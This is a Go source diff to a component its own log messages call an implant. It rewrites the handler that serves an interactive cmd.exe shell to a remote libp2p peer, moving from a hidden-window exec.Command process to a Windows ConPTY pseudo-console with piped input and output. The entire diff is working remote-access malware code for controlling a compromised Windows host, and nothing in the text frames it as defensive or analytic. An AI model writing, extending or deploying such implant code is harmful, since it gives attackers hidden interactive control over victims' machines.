@@ -3,15 +3,34 @@
 package core
 
 import (
-	"bytes"
 	"encoding/binary"
 	"io"
 	"log"
-	"os/exec"
-	"syscall"
+	"unsafe"
 
 	"github.com/libp2p/go-libp2p/core/network"
+	"golang.org/x/sys/windows"
 )
+
+type pipeHandle struct {
+	h windows.Handle
+}
+
+func (p *pipeHandle) Read(b []byte) (int, error) {
+	var n uint32
+	err := windows.ReadFile(p.h, b, &n, nil)
+	return int(n), err
+}
+
+func (p *pipeHandle) Write(b []byte) (int, error) {
+	var n uint32
+	err := windows.WriteFile(p.h, b, &n, nil)
+	return int(n), err
+}
+
+func (p *pipeHandle) Close() error {
+	return windows.CloseHandle(p.h)
+}
 
 func (a *Agent) handleShellStream(s network.Stream) {
 	defer s.Close()
@@ -31,47 +50,112 @@ func (a *Agent) handleShellStream(s network.Stream) {
 		cols = 120
 	}
 
-	cmd := exec.Command("cmd.exe")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	stdin, err := cmd.StdinPipe()
-	if err != nil {
-		log.Printf("[implant] stdin pipe: %v", err)
+	var hPtyIn, hCmdIn windows.Handle
+	var hCmdOut, hPtyOut windows.Handle
+	if err := windows.CreatePipe(&hPtyIn, &hCmdIn, nil, 0); err != nil {
+		log.Printf("[implant] pipe in: %v", err)
 		return
 	}
-	stdout, err := cmd.StdoutPipe()
-	if err != nil {
-		log.Printf("[implant] stdout pipe: %v", err)
-		return
-	}
-	cmd.Stderr = cmd.Stdout
-
-	if err := cmd.Start(); err != nil {
-		log.Printf("[implant] start cmd: %v", err)
+	if err := windows.CreatePipe(&hCmdOut, &hPtyOut, nil, 0); err != nil {
+		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
+		log.Printf("[implant] pipe out: %v", err)
 		return
 	}
 
-	log.Printf("[implant] shell started for %s", remotePeer.String())
+	var hPC windows.Handle
+	if err := windows.CreatePseudoConsole(
+		windows.Coord{X: int16(cols), Y: int16(rows)},
+		hPtyIn, hPtyOut, 0, &hPC,
+	); err != nil {
+		log.Printf("[implant] create pty: %v", err)
+		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
+		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
+		return
+	}
+
+	attrList, err := windows.NewProcThreadAttributeList(1)
+	if err != nil {
+		log.Printf("[implant] attr list: %v", err)
+		windows.ClosePseudoConsole(hPC)
+		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
+		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
+		return
+	}
+	defer attrList.Delete()
+
+	if err := attrList.Update(
+		windows.PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
+		unsafe.Pointer(&hPC),
+		unsafe.Sizeof(hPC),
+	); err != nil {
+		log.Printf("[implant] update attr: %v", err)
+		windows.ClosePseudoConsole(hPC)
+		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
+		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
+		return
+	}
+
+	cmdW, err := windows.UTF16PtrFromString("cmd.exe")
+	if err != nil {
+		windows.ClosePseudoConsole(hPC)
+		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
+		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
+		return
+	}
+
+	si := windows.StartupInfoEx{}
+	si.StartupInfo.Cb = uint32(unsafe.Sizeof(windows.StartupInfoEx{}))
+	// ConPTY handles the stdio — no STARTF_USESTDHANDLES needed
+	si.ProcThreadAttributeList = attrList.List()
+
+	pi := new(windows.ProcessInformation)
+	err = windows.CreateProcess(
+		nil, cmdW,
+		nil, nil,
+		false,
+		windows.EXTENDED_STARTUPINFO_PRESENT|windows.CREATE_UNICODE_ENVIRONMENT,
+		nil, nil,
+		&si.StartupInfo,
+		pi,
+	)
+	if err != nil {
+		log.Printf("[implant] create process: %v", err)
+		windows.ClosePseudoConsole(hPC)
+		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
+		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
+		return
+	}
+
+	windows.CloseHandle(pi.Thread)
+	log.Printf("[implant] shell started via ConPTY for %s", remotePeer.String())
+
+	// hPtyIn and hPtyOut are owned by the ConPTY — do NOT close them until ClosePseudoConsole
+	inPipe := &pipeHandle{h: hCmdIn}
+	outPipe := &pipeHandle{h: hCmdOut}
+
+	done := make(chan struct{}, 2)
 
 	go func() {
-		io.Copy(&crlfWriter{w: stdin}, s)
-		stdin.Close()
-		cmd.Process.Kill()
+		io.Copy(inPipe, s)
+		inPipe.Close()
+		windows.ClosePseudoConsole(hPC)
+		done <- struct{}{}
 	}()
 
-	io.Copy(s, stdout)
-	cmd.Wait()
+	go func() {
+		io.Copy(s, outPipe)
+		outPipe.Close()
+		done <- struct{}{}
+	}()
+
+	<-done
+	windows.ClosePseudoConsole(hPC)
+	s.Close()
+
+	<-done
+
+	windows.WaitForSingleObject(pi.Process, 5000)
+	windows.CloseHandle(pi.Process)
 
 	log.Printf("[implant] shell ended for %s", remotePeer.String())
-}
-
-type crlfWriter struct {
-	w io.WriteCloser
-}
-
-func (c *crlfWriter) Write(p []byte) (int, error) {
-	expanded := bytes.ReplaceAll(p, []byte{'\n'}, []byte{'\r', '\n'})
-	if _, err := c.w.Write(expanded); err != nil {
-		return 0, err
-	}
-	return len(p), nil
 }
